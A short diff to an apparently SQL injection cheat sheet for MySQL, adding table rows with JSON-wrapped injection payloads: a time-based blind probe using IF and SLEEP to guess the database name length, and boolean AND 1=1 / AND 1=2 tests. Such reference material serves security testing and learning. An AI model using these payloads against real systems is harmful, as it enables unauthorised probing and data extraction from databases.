@@ -15,8 +15,16 @@
             <td>SELECT IF(1=2,'true','false')</td>
         </tr>
         <tr>
+            <td>If/Else (json)</td>
+            <td>{"id"="xxx AND IF(length(database())=’1’, SLEEP(15),1)#”}<br/>If the database name's length is 1, database gets unresponsive with given miliseconds</td>
+        </tr>
+        <tr>
             <td>Logical OR</td>
             <td>SELECT 1 || 0<br><em>To see nuances of this operator go <a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/5.7/en/logical-operators.html#operator_or">here</a></em></td>
+        </tr>
+        <tr>
+            <td>AND (json)</td>
+            <td>{"id"="xxx AND 1=1#"}<br/>True statement<br/>{"id"="xxx AND 1=2#"}<br/>False statement</td>
         </tr>
     </tbody>
 </table>
